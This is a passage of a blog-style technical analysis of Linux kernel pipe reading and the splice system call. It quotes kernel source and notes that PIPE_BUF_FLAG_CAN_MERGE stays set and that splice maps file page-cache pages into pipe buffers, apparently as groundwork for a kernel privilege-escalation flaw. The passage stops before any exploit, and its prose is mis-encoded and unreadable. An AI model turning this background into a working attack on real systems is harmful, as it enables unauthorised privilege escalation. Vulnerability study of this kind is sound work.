class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line"><span class="keyword">if</span> (wake_next_writer)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;</span><br><span class="line"><span class="type">int</span> err = file_update_time(filp);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line">ret = err;</span><br><span class="line">sb_end_write(file_inode(filp)-&gt;i_sb);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç®¡é“çš„è¯»å‡ºè¿‡ç¨‹"><a href="#ç®¡é“çš„è¯»å‡ºè¿‡ç¨‹" class="headerlink" title="ç®¡é“çš„è¯»å‡ºè¿‡ç¨‹"></a>ç®¡é“çš„è¯»å‡ºè¿‡ç¨‹</h3><p>ä»ç®¡é“ä¸­è¯»å‡ºæ•°æ®åˆ™æ˜¯é€šè¿‡ <code>pipe_read</code>ï¼Œä¸»è¦æ˜¯è¯»å– buffer å¯¹åº” page ä¸Šçš„æ•°æ®ï¼Œè‹¥ä¸€ä¸ª buffer è¢«è¯»å®Œäº†åˆ™å°†å…¶å‡ºåˆ—</p><p>åŸç†è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè¿™é‡Œå°±ä¸æ·±å…¥åˆ†æäº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_read</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *to)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> total_len = iov_iter_count(to);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="type">bool</span> was_full, wake_next_reader = <span class="literal">false</span>;</span><br><span class="line"><span class="type">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null read succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è‹¥ç®¡é“æ»¡äº†ï¼Œæˆ‘ä»¬åªåœ¨å¼€å§‹è¯»å–æ—¶å”¤é†’å†™è€…</span></span><br><span class="line"><span class="comment"> * ä»¥é¿å…æ²¡æœ‰å¿…è¦çš„å”¤é†’</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ä½†å½“æˆ‘ä»¬å”¤é†’å†™è€…æ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªåŒæ­¥å”¤é†’(WF_SYNC)</span></span><br><span class="line"><span class="comment"> * å› ä¸ºæˆ‘ä»¬æƒ³è¦ä»–ä»¬è¡ŒåŠ¨èµ·æ¥å¹¶ä¸ºæˆ‘ä»¬ç”Ÿæˆæ›´å¤šæ•°æ®</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head = pipe-&gt;head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail = pipe-&gt;tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;note_loss) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification</span> <span class="title">n</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (total_len &lt; <span class="number">8</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -ENOBUFS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n.type = WATCH_TYPE_META;</span><br><span class="line">n.subtype = WATCH_META_LOSS_NOTIFICATION;</span><br><span class="line">n.info = watch_sizeof(n);</span><br><span class="line"><span class="keyword">if</span> (copy_to_iter(&amp;n, <span class="keyword">sizeof</span>(n), to) != <span class="keyword">sizeof</span>(n)) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += <span class="keyword">sizeof</span>(n);</span><br><span class="line">total_len -= <span class="keyword">sizeof</span>(n);</span><br><span class="line">pipe-&gt;note_loss = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe_empty(head, tail)) &#123;<span class="comment">// ç®¡é“éç©ºï¼Œé€ buffer è¯»å‡ºæ•°æ®</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];</span><br><span class="line"><span class="type">size_t</span> chars = buf-&gt;len;</span><br><span class="line"><span class="type">size_t</span> written;</span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chars &gt; total_len) &#123;</span><br><span class="line"><span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -ENOBUFS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">chars = total_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = error;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å°† buffer å¯¹åº” page æ•°æ®æ‹·è´å‡ºæ¥</span></span><br><span class="line">written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);</span><br><span class="line"><span class="keyword">if</span> (unlikely(written &lt; chars)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += chars;</span><br><span class="line">buf-&gt;offset += chars;</span><br><span class="line">buf-&gt;len -= chars;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* è¿™æ˜¯ä¸€ä¸ª packet bufferï¼Ÿæ¸…ç†å¹¶é€€å‡º */</span></span><br><span class="line"><span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) &#123;</span><br><span class="line">total_len = chars;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!buf-&gt;len) &#123;<span class="comment">// buffer ç©ºäº†ï¼Œé‡Šæ”¾</span></span><br><span class="line">pipe_buf_release(pipe, buf);</span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)</span><br><span class="line">pipe-&gt;note_loss = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">tail++;<span class="comment">// è¢«è¯»çš„ buffer å‡ºé˜Ÿ</span></span><br><span class="line">pipe-&gt;tail = tail;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">&#125;</span><br><span class="line">total_len -= chars;</span><br><span class="line"><span class="keyword">if</span> (!total_len)</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">/* å¸¸è§„è·¯å¾„ï¼šè¯»å–æˆåŠŸ */</span></span><br><span class="line"><span class="keyword">if</span> (!pipe_empty(head, tail))<span class="comment">/* More to do? */</span></span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">// æ²¡è¯»å®Œï¼Œè¿˜æœ‰æ•°æ®ï¼Œæ¥ç€è¯»</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;writers)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æˆ‘ä»¬åªæœ‰åœ¨ç¡®å®æ²¡è¯»åˆ°ä¸œè¥¿æ—¶åˆ°è¾¾è¿™é‡Œ</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ç„¶è€Œï¼Œæˆ‘ä»¬æˆ–è®¸å·²çœ‹åˆ°ï¼ˆå¹¶ç§»é™¤ï¼‰ ä¸€ä¸ª size ä¸º 0 çš„ bufferï¼Œ</span></span><br><span class="line"><span class="comment"> * è¿™å¯èƒ½ä¼šåœ¨ buffers ä¸­åˆ›é€ ç©ºé—´</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ä½ æ— æ³•é€šè¿‡ä¸€ä¸ªç©ºå†™å…¥æ¥åˆ¶é€  size ä¸º 0 çš„ pipe buffersï¼ˆpacket mode ä¹Ÿä¸è¡Œï¼‰</span></span><br><span class="line"><span class="comment"> * ä½†è‹¥å†™è€…åœ¨å°è¯•å¡«å……ä¸€ä¸ªå·²ç»åˆ†é…å¹¶æ’å…¥åˆ° buffer æ•°ç»„ä¸­</span></span><br><span class="line"><span class="comment"> * çš„ buffer æ—¶è·å¾—äº†ä¸€ä¸ª EFAULTï¼Œåˆ™è¿™æ˜¯æœ‰å¯èƒ½å‘ç”Ÿçš„</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * æ•…æˆ‘ä»¬ä»éœ€åœ¨ã€éå¸¸ã€‘ä¸å¤ªå¯èƒ½å‘ç”Ÿçš„æƒ…å†µï¼š</span></span><br><span class="line"><span class="comment"> * â€œç®¡é“æ»¡äº†ï¼Œä½†æˆ‘ä»¬æ²¡æœ‰è·å¾—æ•°æ®â€ä¸‹</span></span><br><span class="line"><span class="comment"> * å”¤é†’ä»»ä½•ç­‰å¾…çš„å†™è€…</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(was_full))</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ä½†å› ä¸ºæˆ‘ä»¬æ²¡æœ‰è¯»åˆ°ä»»ä½•ä¸œè¥¿ï¼Œè‹¥æˆ‘ä»¬æ‰“æ–­äº†ï¼Œåˆ™è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ç›´æ¥</span></span><br><span class="line"><span class="comment"> * è¿”å›ä¸€ä¸ª-ERESTARTSYSï¼Œ</span></span><br><span class="line"><span class="comment"> * å› ä¸ºæˆ‘ä»¬å·²ç»å®Œæˆäº†ä»»ä½•æ‰€éœ€çš„ç¯å¢ƒï¼Œæ²¡æœ‰å¿…è¦æ ‡è®°ä»»ä½•å¯è®¿é—®. </span></span><br><span class="line"><span class="comment"> * ä¸”æˆ‘ä»¬å·²é‡Šæ”¾äº†é”ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -ERESTARTSYS;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);</span><br><span class="line">wake_next_reader = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pipe_empty(pipe-&gt;head, pipe-&gt;tail))</span><br><span class="line">wake_next_reader = <span class="literal">false</span>;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (was_full)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line"><span class="keyword">if</span> (wake_next_reader)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">file_accessed(filp);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ€»ç»“ï¼šå¯¹äºä¸€ä¸ªåˆšåˆšå»ºç«‹çš„ç®¡é“ï¼Œå…¶ buffer æ•°ç»„å…¶å®å¹¶æ²¡æœ‰åˆ†é…å¯¹åº”çš„é¡µé¢ç©ºé—´ï¼Œä¹Ÿæ²¡æœ‰è®¾ç½®æ ‡å¿—ä½ï¼›åœ¨æˆ‘ä»¬å‘ç®¡é“å†…å†™å…¥æ•°æ®æ—¶ä¼šé€šè¿‡ buddy system ä¸ºå¯¹åº” buffer åˆ†é…æ–°çš„é¡µæ¡†ï¼Œ<strong>å¹¶è®¾ç½® PIPE_BUF_FLAG_CAN_MERGE æ ‡å¿—ä½ï¼Œæ ‡å¿—è¯¥ buffer å¯ä»¥è¿›è¡Œå†™å…¥</strong>ï¼›è€Œå½“æˆ‘ä»¬ä»ç®¡é“ä¸­è¯»å‡ºæ•°æ®ä¹‹åï¼Œçºµä½¿ä¸€ä¸ª buffer å¯¹åº”çš„ page ä¸Šçš„æ•°æ®è¢«è¯»å®Œäº†ï¼Œæˆ‘ä»¬ä¹Ÿä¸ä¼šé‡Šæ”¾è¯¥ pageï¼Œè€Œå¯ä»¥ä¹Ÿä¼šç›´æ¥æŠ•å…¥åˆ°ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¸­ï¼Œ<strong>å› æ­¤ä¼šä¿ç•™ PIPE_BUF_FLAG_CAN_MERGE æ ‡å¿—ä½</strong></p><h2 id="spliceï¼šæ–‡ä»¶ä¸ç®¡é“é—´æ•°æ®æ‹·è´"><a href="#spliceï¼šæ–‡ä»¶ä¸ç®¡é“é—´æ•°æ®æ‹·è´" class="headerlink" title="spliceï¼šæ–‡ä»¶ä¸ç®¡é“é—´æ•°æ®æ‹·è´"></a>spliceï¼šæ–‡ä»¶ä¸ç®¡é“é—´æ•°æ®æ‹·è´</h2><p>å½“æˆ‘ä»¬æƒ³è¦å°†ä¸€ä¸ªæ–‡ä»¶çš„æ•°æ®æ‹·è´åˆ°å¦ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œæ¯”è¾ƒæœ´ç´ çš„ä¸€ç§æƒ³æ³•æ˜¯æ‰“å¼€ä¸¤ä¸ªæ–‡ä»¶åå°†æºæ–‡ä»¶æ•°æ®è¯»å…¥åå†å†™å…¥ç›®æ ‡æ–‡ä»¶ï¼Œä½†è¿™æ ·çš„åšæ³•éœ€è¦åœ¨ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ä¹‹é—´æ¥å›è¿›è¡Œæ•°æ®æ‹·è´ï¼Œ<strong>å…·æœ‰å¯è§‚çš„å¼€é”€</strong></p><p>å› æ­¤ä¸ºäº†å‡å°‘è¿™æ ·çš„å¼€é”€ï¼Œ <code>splice</code>è¿™ä¸€ä¸ªéå¸¸ç‹¬ç‰¹çš„ç³»ç»Ÿè°ƒç”¨åº”è¿è€Œç”Ÿï¼Œå…¶ä½œç”¨æ˜¯<strong>åœ¨æ–‡ä»¶ä¸ç®¡é“ä¹‹é—´è¿›è¡Œæ•°æ®æ‹·è´</strong>ï¼Œä»¥æ­¤<strong>å°†å†…æ ¸ç©ºé—´ä¸ç”¨æˆ·ç©ºé—´ä¹‹é—´çš„æ•°æ®æ‹·è´è½¬å˜ä¸ºå†…æ ¸ç©ºé—´å†…çš„æ•°æ®æ‹·è´ï¼Œä»è€Œé¿å…äº†æ•°æ®åœ¨ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ä¹‹é—´çš„æ‹·è´é€ æˆçš„å¼€é”€</strong></p><p>glibc ä¸­çš„ wrapper å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE         <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">splice</span><span class="params">(<span class="type">int</span> fd_in, <span class="type">loff_t</span> *off_in, <span class="type">int</span> fd_out,</span></span><br><span class="line"><span class="params">               <span class="type">loff_t</span> *off_out, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure><p>splice ç³»ç»Ÿè°ƒç”¨<strong>æœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨ç®¡é“åœ¨å†…æ ¸ç©ºé—´ä¸­è¿›è¡Œæ•°æ®æ‹·è´</strong>ï¼Œæ¯«æ— ç–‘é—®çš„æ˜¯ï¼Œç®¡é“æ˜¯ä¸€ä¸ªååˆ†å¥½ç”¨çš„å†…æ ¸ç¼“å†²åŒºï¼Œäºæ˜¯ splice ç³»ç»Ÿè°ƒç”¨é€‰æ‹©ä½¿ç”¨ç®¡é“ä½œä¸ºä¸­é—´çš„æ•°æ®ç¼“å†²åŒº</p><p>å½“ä½ æƒ³è¦å°†æ•°æ®ä»ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦æ‹·è´åˆ°å¦ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸­ï¼Œåªéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œä¹‹åä½¿ç”¨ splice ç³»ç»Ÿè°ƒç”¨å°†æ•°æ®ä»æºæ–‡ä»¶æè¿°ç¬¦æ‹·è´åˆ°ç®¡é“ä¸­ã€å†ä½¿ç”¨ splice ç³»ç»Ÿè°ƒç”¨å°†æ•°æ®ä»ç®¡é“ä¸­æ‹·è´åˆ°ç›®çš„æ–‡ä»¶æè¿°ç¬¦å³å¯ã€‚è¿™æ ·çš„è®¾è®¡ä½¿å¾—æˆ‘ä»¬åªéœ€è¦ä¸¤æ¬¡ç³»ç»Ÿè°ƒç”¨ä¾¿èƒ½å®Œæˆæ•°æ®åœ¨ä¸åŒæ–‡ä»¶æè¿°ç¬¦é—´çš„æ‹·è´å·¥ä½œï¼Œä¸”<strong>æ•°æ®çš„æ‹·è´éƒ½åœ¨å†…æ ¸ç©ºé—´ä¸­å®Œæˆï¼Œæå¤§åœ°å‡å°‘äº†å¼€é”€</strong></p><p>splice ç³»ç»Ÿè°ƒç”¨æ­£å¼æ“ä½œå‰éƒ½æ˜¯ä¸€äº›åŸºç¡€çš„æ£€æŸ¥å·¥ä½œï¼Œè¿™ä¸€å—ä¸æ·±å…¥åˆ†æï¼Œå­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_splice()// æ£€æŸ¥æ–‡ä»¶æè¿°ç¬¦æ˜¯å¦å¯ç”¨</span><br><span class="line">__do_splice()// æ£€æŸ¥æ˜¯å¦å…¥è®¾ç½®äº†åç§»æˆ–å‡ºè®¾ç½®äº†åç§»ï¼ˆä»»ä¸€åˆ™è¿”å›ï¼‰</span><br><span class="line">do_splice()// åˆ†æµ</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ–‡ä»¶ä¸ç®¡é“é—´çš„åˆ†æµå‘ç”Ÿåœ¨ <code>do_splice()</code> å‡½æ•°ï¼š</p><ul><li>ä»ç®¡é“è¯»å–åˆ°ç®¡é“ï¼Œè°ƒç”¨ <code>splice_pipe_to_pipe()</code></li><li>ä»æ–‡ä»¶è¯»å–åˆ°ç®¡é“ï¼Œè°ƒç”¨ <code>splice_file_to_pipe()</code></li><li>ä»ç®¡é“è¯»å–åˆ°æ–‡ä»¶ï¼Œè°ƒç”¨ <code>do_splice_from()</code></li></ul><h3 id="ä»æ–‡ä»¶è¯»å–åˆ°ç®¡é“"><a href="#ä»æ–‡ä»¶è¯»å–åˆ°ç®¡é“" class="headerlink" title="ä»æ–‡ä»¶è¯»å–åˆ°ç®¡é“"></a>ä»æ–‡ä»¶è¯»å–åˆ°ç®¡é“</h3><p>ä»æ–‡ä»¶è¯»å–æ•°æ®åˆ°ç®¡é“çš„æ ¸å¿ƒåŸç†æ˜¯ï¼š<strong>å°† pipe_buffer å¯¹åº”çš„ page è®¾ç½®ä¸ºæ–‡ä»¶æ˜ å°„çš„ page</strong></p><p>å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">splice_file_to_pipe()</span><br><span class="line">do_splice_to()</span><br></pre></td></tr></table></figure><p>åœ¨ <code>do_splice_to</code> ä¸­æœ€ç»ˆä¼šè°ƒç”¨åˆ°å†…æ ¸æ–‡ä»¶ç»“æ„ä½“å‡½æ•°è¡¨çš„ <code>splice_read</code> æŒ‡é’ˆï¼Œå¯¹äºä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿè€Œè¨€è¯¥å‡½æ•°æŒ‡é’ˆä¸åŒï¼Œä»¥ ext4 æ–‡ä»¶ç³»ç»Ÿä¸ºä¾‹ï¼ŒæŸ¥è¡¨ <code>ext4_file_operations</code>ï¼Œå¯¹åº”è°ƒç”¨çš„å‡½æ•°åº”ä¸º <code>generic_file_splice_read</code>ï¼Œå­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">generic_file_splice_read()</span><br><span class="line">    call_read_iter()</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æ˜¯æ–‡ä»¶å‡½æ•°è¡¨ä¸­ <code>read_iter()</code> çš„ wrapperï¼Œå¯¹ ext4 è€Œè¨€å¯¹åº”è°ƒç”¨ <code>ext4_file_read_iter</code>ï¼Œæºç æ¯”è¾ƒå¤šï¼Œè¿™é‡Œåªè´´å‡ºæ ¸å¿ƒè°ƒç”¨é“¾ï¼Œæœ€ç»ˆè°ƒç”¨åˆ°æ ¸å¿ƒå‡½æ•°æ˜¯ <code>filemap_read()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ext4_file_read_iter()</span><br><span class="line">    generic_file_read_iter()</span><br><span class="line">    filemap_read()</span><br><span class="line">    filemap_get_pages()<span class="comment">// è·å–åˆ°æ–‡ä»¶å¯¹åº”æ˜ å°„çš„é¡µé¢é›†</span></span><br><span class="line">    copy_page_to_iter()<span class="comment">// è¿›è¡Œé¡µé¢æ‹·è´ï¼ˆå•ä½ä¸ºå•ä¸ªé¡µé¢ï¼‰</span></span><br><span class="line">    __copy_page_to_iter()</span><br><span class="line">    copy_page_to_iter_pipe()<span class="comment">// æˆ‘ä»¬æ˜¯ç®¡é“ï¼Œæ‰€ä»¥èµ°å…¥è¯¥åˆ†æ”¯</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆåœ¨ <code>copy_page_to_iter_pipe()</code> ä¸­ï¼Œå°†å¯¹åº”çš„ <code>pipe_buffer-&gt;page</code> è®¾ä¸º<strong>æ–‡ä»¶æ˜ 